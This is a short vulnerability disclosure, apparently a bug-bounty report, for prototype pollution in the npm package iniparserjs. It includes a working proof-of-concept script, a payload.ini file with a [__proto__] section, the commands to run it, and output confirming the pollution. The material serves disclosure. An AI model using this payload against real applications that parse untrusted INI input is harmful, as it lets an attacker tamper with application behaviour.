# Description

`iniparserjs` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var path = require("path")
var IniParser = require("iniparserjs")
console.log('Before:', {}.polluted);
var config = new IniParser(path.join(__dirname, "payload.ini"), "UTF8")
var sections = config.sections()
console.log('After:', {}.polluted);


//payload.ini
[__proto__]
polluted = "Yes! Its Polluted";
```


2. Execute the following commands in terminal:

```
npm i iniparserjs # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
